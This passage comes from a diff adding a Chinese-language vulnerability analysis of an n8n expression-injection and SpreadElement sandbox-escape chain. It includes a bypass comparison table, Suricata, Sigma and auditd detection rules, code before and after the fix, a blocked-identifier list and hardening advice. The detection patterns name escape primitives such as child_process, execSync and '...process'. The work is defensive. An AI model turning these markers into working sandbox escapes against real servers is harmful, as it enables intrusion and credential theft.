+<td>v2.4.0 修复前后</td>
+<td>当前漏洞</td>
+</tr>
+<tr>
+<td><strong>绕过层级</strong></td>
+<td>运行时 sanitizer 层</td>
+<td>运行时 sanitizer 层</td>
+<td>编译阶段 AST 重写层</td>
+</tr>
+<tr>
+<td><strong>核心原理</strong></td>
+<td>利用模板字符串 <code>`${process}`</code> 绕过基于正则的标识符检测</td>
+<td>通过 <code>Object.defineProperty</code> 劫持对象属性，间接获取 <code>process</code> 引用</td>
+<td>利用 <code>{...process}</code> 使 <code>process</code> 出现在 SpreadElement 节点，AST 检查遗漏</td>
+</tr>
+<tr>
+<td><strong>AST 节点类型</strong></td>
+<td>TemplateLiteral</td>
+<td>CallExpression (Object.defineProperty)</td>
+<td>SpreadElement</td>
+</tr>
+<tr>
+<td><strong>被拦截方式</strong></td>
+<td>v2.4.0 sanitizer 新增模板字符串检测</td>
+<td>v2.4.0 sanitizer 新增 <code>defineProperty</code> 调用检测</td>
+<td>需在 AST 重写层新增 SpreadElement case</td>
+</tr>
+<tr>
+<td><strong>绕过难度</strong></td>
+<td>低（正则边界条件易找）</td>
+<td>中（需理解原型链与属性劫持）</td>
+<td>高（需理解 AST 遍历器的 case 覆盖盲区）</td>
+</tr>
+<tr>
+<td><strong>修复方式</strong></td>
+<td>补充正则规则</td>
+<td>补充正则规则</td>
+<td>重构 AST 遍历逻辑 + 添加 blocked identifier</td>
+</tr>
+<tr>
+<td><strong>根因</strong></td>
+<td>sanitizer 正则不完整</td>
+<td>sanitizer 正则不完整</td>
+<td>AST 节点类型检查列表不完整</td>
+</tr>
+<tr>
+<td><strong>启示</strong></td>
+<td>运行时过滤始终存在绕过空间</td>
+<td>运行时过滤始终存在绕过空间</td>
+<td>必须从编译阶段彻底封堵标识符访问</td>
+</tr>
+</tbody>
+</table>
+<p>从这张对比表可以看出一个清晰的趋势：n8n 表达式沙箱的攻防焦点正在从<strong>运行时 sanitizer 层</strong>向<strong>编译阶段 AST 重写层</strong>下移。每一次运行时补丁都是在补漏洞，而真正彻底的防御必须在编译阶段确保所有 AST 节点类型的全覆盖。SpreadElement 绕过之所以危害极大，正是因为它跳过了之前所有运行时补丁的防御，直接从编译层打开缺口。</p>
+<hr />
+<h2>八、检测规则</h2>
+<p>针对这条攻击链，以下从网络流量、日志审计和主机行为三个维度给出检测规则。</p>
+<h3>8.1 Suricata 网络流量检测规则</h3>
+<div class="highlight"><pre><span></span><code><span class="c1"># 检测 n8n Form Node 表单提交中的 SpreadElement RCE Payload</span>
+<span class="c1"># 针对 CVE-2026-27493 + CVE-2026-27577 组合利用</span>
+
+<span class="n">alert</span><span class="w"> </span><span class="n">http</span><span class="w"> </span><span class="n">any</span><span class="w"> </span><span class="n">any</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">any</span><span class="w"> </span><span class="n">any</span><span class="w"> </span><span class="p">(</span>
+<span class="w">    </span><span class="n">msg</span><span class="p">:</span><span class="s2">&quot;n8n Form Node SpreadElement RCE Attempt CVE-2026-27493&quot;</span><span class="p">;</span>
+<span class="w">    </span><span class="n">flow</span><span class="p">:</span><span class="n">established</span><span class="p">,</span><span class="n">to_server</span><span class="p">;</span>
+<span class="w">    </span><span class="n">http</span><span class="o">.</span><span class="n">method</span><span class="p">;</span><span class="w"> </span><span class="n">content</span><span class="p">:</span><span class="s2">&quot;POST&quot;</span><span class="p">;</span>
+<span class="w">    </span><span class="n">http</span><span class="o">.</span><span class="n">uri</span><span class="p">;</span><span class="w"> </span><span class="n">content</span><span class="p">:</span><span class="s2">&quot;/form/&quot;</span><span class="p">;</span><span class="w"> </span><span class="n">startswith</span><span class="p">;</span>
+<span class="w">    </span><span class="n">http</span><span class="o">.</span><span class="n">request_body</span><span class="p">;</span><span class="w"> </span><span class="n">content</span><span class="p">:</span><span class="s2">&quot;getBuiltinModule&quot;</span><span class="p">;</span>
+<span class="w">    </span><span class="n">http</span><span class="o">.</span><span class="n">request_body</span><span class="p">;</span><span class="w"> </span><span class="n">content</span><span class="p">:</span><span class="s2">&quot;child_process&quot;</span><span class="p">;</span>
+<span class="w">    </span><span class="n">http</span><span class="o">.</span><span class="n">request_body</span><span class="p">;</span><span class="w"> </span><span class="n">content</span><span class="p">:</span><span class="s2">&quot;...process&quot;</span><span class="p">;</span>
+<span class="w">    </span><span class="n">distance</span><span class="p">:</span><span class="mi">0</span><span class="p">;</span>
+<span class="w">    </span><span class="n">reference</span><span class="p">:</span><span class="n">cve</span><span class="p">,</span><span class="mi">2026</span><span class="o">-</span><span class="mi">27493</span><span class="p">;</span>
+<span class="w">    </span><span class="n">reference</span><span class="p">:</span><span class="n">cve</span><span class="p">,</span><span class="mi">2026</span><span class="o">-</span><span class="mi">27577</span><span class="p">;</span>
+<span class="w">    </span><span class="n">classtype</span><span class="p">:</span><span class="n">attempted</span><span class="o">-</span><span class="n">admin</span><span class="p">;</span>
+<span class="w">    </span><span class="n">sid</span><span class="p">:</span><span class="mi">1000001</span><span class="p">;</span>
+<span class="w">    </span><span class="n">rev</span><span class="p">:</span><span class="mi">1</span><span class="p">;</span>
+<span class="p">)</span>
+
+<span class="c1"># 检测更通用的 n8n 表达式注入特征</span>
+<span class="n">alert</span><span class="w"> </span><span class="n">http</span><span class="w"> </span><span class="n">any</span><span class="w"> </span><span class="n">any</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">any</span><span class="w"> </span><span class="n">any</span><span class="w"> </span><span class="p">(</span>
+<span class="w">    </span><span class="n">msg</span><span class="p">:</span><span class="s2">&quot;n8n Expression Injection in Form Submission&quot;</span><span class="p">;</span>
+<span class="w">    </span><span class="n">flow</span><span class="p">:</span><span class="n">established</span><span class="p">,</span><span class="n">to_server</span><span class="p">;</span>
+<span class="w">    </span><span class="n">http</span><span class="o">.</span><span class="n">method</span><span class="p">;</span><span class="w"> </span><span class="n">content</span><span class="p">:</span><span class="s2">&quot;POST&quot;</span><span class="p">;</span>
+<span class="w">    </span><span class="n">http</span><span class="o">.</span><span class="n">uri</span><span class="p">;</span><span class="w"> </span><span class="n">content</span><span class="p">:</span><span class="s2">&quot;/form/&quot;</span><span class="p">;</span><span class="w"> </span><span class="n">startswith</span><span class="p">;</span>
+<span class="w">    </span><span class="n">http</span><span class="o">.</span><span class="n">request_body</span><span class="p">;</span><span class="w"> </span><span class="n">content</span><span class="p">:</span><span class="s2">&quot;execSync&quot;</span><span class="p">;</span>
+<span class="w">    </span><span class="n">http</span><span class="o">.</span><span class="n">request_body</span><span class="p">;</span><span class="w"> </span><span class="n">content</span><span class="p">:</span><span class="s2">&quot;{{&quot;</span><span class="p">;</span><span class="w"> </span><span class="n">distance</span><span class="p">:</span><span class="mi">0</span><span class="p">;</span>
+<span class="w">    </span><span class="n">http</span><span class="o">.</span><span class="n">request_body</span><span class="p">;</span><span class="w"> </span><span class="n">content</span><span class="p">:</span><span class="s2">&quot;}}&quot;</span><span class="p">;</span><span class="w"> </span><span class="n">distance</span><span class="p">:</span><span class="mi">0</span><span class="p">;</span>
+<span class="w">    </span><span class="n">classtype</span><span class="p">:</span><span class="n">attempted</span><span class="o">-</span><span class="n">admin</span><span class="p">;</span>
+<span class="w">    </span><span class="n">sid</span><span class="p">:</span><span class="mi">1000002</span><span class="p">;</span>
+<span class="w">    </span><span class="n">rev</span><span class="p">:</span><span class="mi">1</span><span class="p">;</span>
+<span class="p">)</span>
+</code></pre></div>
+
+<h3>8.2 Sigma 日志检测规则</h3>
+<div class="highlight"><pre><span></span><code><span class="nt">title</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">n8n Form Node 表达式注入与沙箱逃逸检测</span>
+<span class="nt">id</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">7a3f2c8e-1234-5678-9abc-def012345678</span>
+<span class="nt">status</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">experimental</span>
+<span class="nt">description</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">&gt;</span>
+<span class="w">    </span><span class="no">检测针对 n8n Form Node 的双重求值表达式注入攻击（CVE-2026-27493）</span>
+<span class="w">    </span><span class="no">及 SpreadElement 沙箱逃逸（CVE-2026-27577）</span>
+<span class="nt">references</span><span class="p">:</span>
+<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-27493</span>
+<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-27577</span>
+<span class="nt">author</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Security Team</span>
+<span class="nt">date</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">2026/07/24</span>
+<span class="nt">logsource</span><span class="p">:</span>
+<span class="w">    </span><span class="nt">product</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">n8n</span>
+<span class="w">    </span><span class="nt">service</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">application</span>
+<span class="nt">detection</span><span class="p">:</span>
+<span class="w">    </span><span class="nt">selection_form_post</span><span class="p">:</span>
+<span class="w">        </span><span class="nt">http.method</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">POST</span>
+<span class="w">        </span><span class="nt">http.uri|startswith</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">/form/</span>
+<span class="w">    </span><span class="nt">selection_payload_markers</span><span class="p">:</span>
+<span class="w">        </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">getBuiltinModule</span>
+<span class="w">        </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">child_process</span>
+<span class="w">        </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">execSync</span>
+<span class="w">        </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">&#39;...process&#39;</span>
+<span class="w">        </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">SpreadElement</span>
+<span class="w">    </span><span class="nt">condition</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">selection_form_post and 1 of selection_payload_markers</span>
+<span class="nt">falsepositives</span><span class="p">:</span>
+<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">合法的表达式测试（极罕见，需人工确认）</span>
+<span class="nt">level</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">critical</span>
+<span class="nt">tags</span><span class="p">:</span>
+<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">attack.initial_access</span>
+<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">attack.execution</span>
+<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">attack.t1190</span>
+<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">cve.2026-27493</span>
+<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">cve.2026-27577</span>
+</code></pre></div>
+
+<h3>8.3 主机行为检测（日志关键词）</h3>
+<p>在 n8n 服务器的系统日志和应用日志中，可监控以下异常行为特征：</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># 检测 n8n 进程派生子进程（正常情况下 n8n 不应频繁 spawn shell）</span>
+<span class="c1"># 适用于 auditd / syslog 检测</span>
+
+<span class="c1"># auditd 规则：监控 n8n (node) 进程的 execve 系统调用</span>
+auditctl<span class="w"> </span>-a<span class="w"> </span>always,exit<span class="w"> </span>-F<span class="w"> </span><span class="nv">arch</span><span class="o">=</span>b64<span class="w"> </span>-S<span class="w"> </span>execve<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>-F<span class="w"> </span><span class="nv">uid</span><span class="o">=</span><span class="m">1000</span><span class="w"> </span>-k<span class="w"> </span>n8n_rce_suspicious
+
+<span class="c1"># 以下日志关键词组合出现时应当告警：</span>
+<span class="c1"># 1. n8n 日志中出现 &quot;evaluateExpression&quot; + &quot;child_process&quot;</span>
+<span class="c1"># 2. n8n 日志中出现 &quot;form-waiting&quot; + 异常 executionId</span>
+<span class="c1"># 3. 系统日志中 node 进程派生 /bin/sh 或 /bin/bash</span>
+<span class="c1"># 4. 网络日志中对 /form/* 端点的 POST 请求体超过 200 字节</span>
+<span class="c1">#    （正常表单提交通常较短，含 payload 的请求体明显更大）</span>
+</code></pre></div>
+
+<h3>8.4 检测策略建议</h3>
+<table>
+<thead>
+<tr>
+<th>检测维度</th>
+<th>检测点</th>
+<th>告警阈值</th>
+<th>误报率</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>网络流量</td>
+<td>POST <code>/form/*</code> 请求体含 <code>execSync</code> / <code>child_process</code></td>
+<td>出现即告警</td>
+<td>极低</td>
+</tr>
+<tr>
+<td>网络流量</td>
+<td>POST <code>/form/*</code> 请求体含 <code>...process</code></td>
+<td>出现即告警</td>
+<td>极低</td>
+</tr>
+<tr>
+<td>应用日志</td>
+<td>n8n 日志中 <code>evaluateExpression</code> 伴随 <code>getBuiltinModule</code></td>
+<td>出现即告警</td>
+<td>低</td>
+</tr>
+<tr>
+<td>主机行为</td>
+<td>node 进程派生 shell 子进程</td>
+<td>出现即告警</td>
+<td>中（需排除合法 Execute Command 节点）</td>
+</tr>
+<tr>
+<td>数据库</td>
+<td><code>credential_entity</code> 表异常批量读取</td>
+<td>单次读取 &gt; 10 条告警</td>
+<td>低</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2>九、修复方案与加固建议</h2>
+<h3>9.1 官方修复方案</h3>
+<p>n8n 官方已在以下版本中修复全部漏洞，<strong>务必立即升级</strong>：</p>
+<table>
+<thead>
+<tr>
+<th>CVE</th>
+<th>修复版本</th>
+<th>修复内容</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>CVE-2026-27493</td>
+<td>n8n 2.10.1 / 2.9.3 / 1.123.22</td>
+<td>删除第二次表达式求值 pass，<code>prepareFormFields</code> 不再调用 <code>evaluateExpression</code></td>
+</tr>
+<tr>
+<td>CVE-2026-27577</td>
+<td>n8n 2.10.1 / 2.9.3 / 1.123.22</td>
+<td>将 <code>process</code>/<code>require</code>/<code>module</code>/<code>Buffer</code> 添加到 blocked identifier list，强化 AST 感知标识符分析，确保全节点类型覆盖</td>
+</tr>
+<tr>
+<td>CVE-2026-21858</td>
+<td>n8n 2.10.1 / 2.9.3 / 1.123.22</td>
+<td>修复任意文件读取漏洞，限制配置文件访问路径</td>
+</tr>
+</tbody>
+</table>
+<h4>CVE-2026-27493 修复原理</h4>
+<p>修复前的 <code>prepareFormFields</code> 会对渲染后的 HTML 执行第二次 <code>evaluateExpression</code>。修复方案直接<strong>移除了第二次求值 pass</strong>：</p>
+<div class="highlight"><pre><span></span><code><span class="c1">// === 修复前（存在漏洞）===</span>
+<span class="kd">function</span><span class="w"> </span><span class="nx">prepareFormFields</span><span class="p">(</span><span class="nx">html</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">resolvables</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">getResolvables</span><span class="p">(</span><span class="nx">html</span><span class="p">);</span>
+<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kd">const</span><span class="w"> </span><span class="nx">r</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="nx">resolvables</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="kd">let</span><span class="w"> </span><span class="nx">inner</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">r</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/{{\s*(.+?)\s*}}/</span><span class="p">)[</span><span class="mf">1</span><span class="p">];</span>
+<span class="w">        </span><span class="kd">let</span><span class="w"> </span><span class="nx">evaluated</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">evaluateExpression</span><span class="p">(</span><span class="nx">inner</span><span class="p">);</span><span class="w">  </span><span class="c1">// &lt;-- 危险！第二次求值</span>
+<span class="w">        </span><span class="nx">html</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">html</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="nx">r</span><span class="p">,</span><span class="w"> </span><span class="nx">evaluated</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">html</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="c1">// === 修复后 ===</span>
+<span class="kd">function</span><span class="w"> </span><span class="nx">prepareFormFields</span><span class="p">(</span><span class="nx">html</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="c1">// 不再对渲染后的 HTML 执行二次求值</span>
+<span class="w">    </span><span class="c1">// getResolvables 仅用于识别静态配置中的表达式占位符</span>
+<span class="w">    </span><span class="c1">// 用户输入注入的内容不会被当作表达式执行</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">html</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>通过移除第二次求值，攻击者在表单字段中提交的 <code>{{ }}</code> 内容不再被引擎执行，从根本上消除了注入路径。</p>
+<h4>CVE-2026-27577 修复原理</h4>
+<p>修复方案从两个层面强化了 AST 标识符分析：</p>
+<ol>
+<li><strong>添加 blocked identifier list</strong>：将 <code>process</code>、<code>require</code>、<code>module</code>、<code>Buffer</code> 等危险标识符加入全局拦截列表，无论出现在哪种 AST 节点类型下，都直接拦截。</li>
+<li><strong>强化 AST 感知标识符分析</strong>：重构 VariablePolyfill Transformer 的遍历逻辑，确保对所有 AST 节点类型（包括 <code>SpreadElement</code>）进行覆盖性检查，消除 fall-through 到 default 的盲区。</li>
+</ol>
+<div class="highlight"><pre><span></span><code><span class="c1">// === 修复后：全局 blocked list + 全节点类型覆盖 ===</span>
+
+<span class="kd">const</span><span class="w"> </span><span class="nx">BLOCKED_IDENTIFIERS</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">Set</span><span class="p">([</span>
+<span class="w">    </span><span class="s1">&#39;process&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;require&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;module&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;Buffer&#39;</span><span class="p">,</span>
+<span class="w">    </span><span class="s1">&#39;global&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;globalThis&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;constructor&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;__proto__&#39;</span>
+<span class="p">]);</span>
+
+<span class="kd">function</span><span class="w"> </span><span class="nx">visitIdentifier</span><span class="p">(</span><span class="nx">path</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">node</span><span class="p">,</span><span class="w"> </span><span class="nx">parent</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">path</span><span class="p">;</span>
+
+<span class="w">    </span><span class="c1">// 修复点1：全局 blocked list，不依赖父节点类型判断</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">BLOCKED_IDENTIFIERS</span><span class="p">.</span><span class="nx">has</span><span class="p">(</span><span class="nx">node</span><span class="p">.</span><span class="nx">name</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="c1">// 无论父节点是什么类型，一律拦截</span>
+<span class="w">        </span><span class="k">throw</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">SecurityError</span><span class="p">(</span>
+<span class="w">            </span><span class="sb">`Blocked identifier &quot;</span><span class="si">${</span><span class="nx">node</span><span class="p">.</span><span class="nx">name</span><span class="si">}</span><span class="sb">&quot; detected`</span>
+<span class="w">        </span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="c1">// 修复点2：全节点类型覆盖的安全上下文检查</span>
+<span class="w">    </span><span class="c1">// 不再使用 switch-case + default fall-through</span>
+<span class="w">    </span><span class="c1">// 改用 allowlist 模式：只有明确安全的父节点类型才放行</span>
+<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">SAFE_CONTEXTS</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">Set</span><span class="p">([</span>
+<span class="w">        </span><span class="s1">&#39;MemberExpression&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;CallExpression&#39;</span><span class="p">,</span><span class="w"> </span><span class="cm">/* ... 全量列举 ... */</span>
+<span class="w">        </span><span class="s1">&#39;SpreadElement&#39;</span><span class="p">,</span><span class="w">  </span><span class="c1">// 现在已覆盖</span>
+<span class="w">    </span><span class="p">]);</span>
+
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">isDangerousInContext</span><span class="p">(</span><span class="nx">node</span><span class="p">,</span><span class="w"> </span><span class="nx">parent</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="nx">SAFE_CONTEXTS</span><span class="p">.</span><span class="nx">has</span><span class="p">(</span><span class="nx">parent</span><span class="p">.</span><span class="nx">type</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">throw</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">SecurityError</span><span class="p">(</span>
+<span class="w">            </span><span class="sb">`Unsafe identifier context: </span><span class="si">${</span><span class="nx">parent</span><span class="p">.</span><span class="nx">type</span><span class="si">}</span><span class="sb">`</span>
+<span class="w">        </span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<h3>9.2 纵深防御加固建议</h3>
+<p>仅升级版本不足以应对未来可能出现的新漏洞，建议从以下维度构建纵深防御：</p>
+<p><strong>1. 网络层隔离</strong>
+- 将 n8n 的 <code>/form/*</code> 端点通过反向代理（Nginx/Cloudflare）进行 WAF 防护，拦截请求体中包含 <code>{{ }}</code>、<code>execSync</code>、<code>child_process</code>、<code>...process</code> 等特征的请求。
+- 对公网暴露的 n8n 实例启用 IP 白名单或 mTLS 认证，限制表单端点的访问来源。
+- 定期使用网络空间测绘工具（FOFA/Shodan）排查组织资产中暴露的 n8n 实例。</p>
+<p><strong>2. 凭证安全加固</strong>
+- 使用外部密钥管理系统（如 HashiCorp Vault、AWS Secrets Manager）替代 n8n 内置的凭证存储，降低主密钥泄露后的影响面。
+- 如果必须使用 n8n 内置凭证存储，确保 <code>N8N_ENCRYPTION_KEY</code> 通过环境变量注入（而非配置文件），并配合操作系统级的 secrets 管理（如 Docker Secrets、Kubernetes Secrets）。
+- 对存储的凭证实施最小权限原则——AWS Key 仅授予工作流所需的最小 IAM 权限，数据库账号仅授予所需表的读写权限。</p>
+<p><strong>3. 运行时加固</strong>
+- 以非特权用户运行 n8n 进程（如 <code>node</code> 用户），配合 AppArmor/SELinux 限制 n8n 进程的系统调用权限。
+- 在容器化部署中启用只读根文件系统（<code>readonlyRootFilesystem: true</code>），限制 n8n 容器的文件写入能力。
+- 部署 Falco 或 Tracee 等 eBPF 运行时安全工具，监控 n8n 容器内的异常进程派生行为。</p>
+<p><strong>4. 沙箱架构反思</strong>
+- n8n 表达式沙箱基于 <code>@n8n/tournament</code> 的 AST 重写方案，本质上是一种"黑名单"防御——列出危险标识符并拦截。这种方案的固有缺陷是：只要遗漏一个节点类型或一个标识符，就会被绕过。
+- 更稳健的方案是采用"白名单"沙箱——仅允许表达式访问明确声明的安全全局对象（如 <code>$input</code>、<code>$json</code>、<code>$now</code>），其余所有标识符一律拒绝。这种方案的安全性不依赖于对攻击手法的穷举，而是基于最小暴露面原则。</p>
+<hr />
+<h2>十、总结与启示</h2>
+<p>n8n 五连杀漏洞链是低代码/无代码平台安全风险的典型案例。这条攻击链的技术启示可归纳为以下三点：</p>
+<p><strong>第一，双重求值是表达式注入的温床。</strong> 当用户输入经过一次求值后被注入到模板中，而模板又经历第二次求值时，攻击者就有了将恶意代码"夹带"进第二次求值的机会。任何涉及模板渲染与表达式求值的系统，都应严格遵循"一次求值"原则——用户输入要么作为数据（不被求值），要么作为代码（经过严格沙箱），绝不能在数据与代码之间发生身份转换。</p>
+<p><strong>第二，AST 重写的盲区是沙箱逃逸的突破口。</strong> 基于 AST 重写的沙箱方案，其安全性完全取决于节点类型覆盖的完整性。SpreadElement 绕过揭示了一个普遍性教训：当安全检查基于 switch-case + default fall-through 结构时，任何一个遗漏的 case 都会成为逃逸通道。正确的做法是采用 allowlist 模式——默认拒绝，仅对明确安全的情况放行。</p>
+<p><strong>第三，凭证集中存储放大了单点突破的影响。</strong> n8n 作为工作流编排中枢，天然需要集中存储大量第三方凭证。一旦主加密密钥泄露，所有凭证瞬间失去保护。这要求平台设计者在凭证管理上采用"零信任"思维——即使平台本身被攻破，凭证也不应能被直接批量解密。外部密钥管理、凭证级别的独立加密、定期密钥轮换，都是降低此类风险的有效手段。</p>
+<p>对于仍在使用未修复版本 n8n 的组织，<strong>立即升级至 2.10.1 及以上版本是唯一的正确选择</strong>。在全球 12000+ 台服务器已被入侵的背景下，任何延迟都意味着将自己的 AWS 密钥、数据库密码和 OAuth 令牌置于攻击者的解密队列之中。</p>
+<hr />
+<blockquote>
+<p><strong>免责声明</strong>：本文所涉 PoC 代码与技术分析仅供安全研究、授权渗透测试与防御建设参考。未经授权对他人系统进行漏洞利用属于违法行为。请勿将本文内容用于任何非法用途。</p>
+</blockquote>
+<div class="back"><a href="../">← Back to Home</a></div>
+</article>
+</main>
+<footer>Powered by GitHub Pages 2026</footer>
+</body>
+</html>
